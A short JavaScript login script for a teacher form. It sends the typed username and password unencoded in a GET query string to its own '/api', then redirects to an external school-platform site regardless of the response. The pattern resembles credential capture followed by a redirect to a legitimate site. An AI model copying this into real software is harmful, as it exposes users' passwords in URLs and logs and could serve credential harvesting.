
const form = document.querySelector("#login_form");

const field_name = document.querySelector("#login_user");
const field_password = document.querySelector("#login_password");

const button = document.querySelector("#button_teacher");

const Post_teacher = async(user = "", password = "") => {    

    fetch(`/api?user=${user}&password=${password}`) 
    .then(function(res){ return res.json(); })
    .then(function(data){ console.log( JSON.stringify( data ) ) })
}

button.addEventListener("click", async() => {
    if (!form.checkValidity()) {
        alert("Ingrese datos validos")
    } else {
        await Post_teacher(field_name.value,field_password.value);
        window.location.replace("https://www.master2000.net/");

    }
})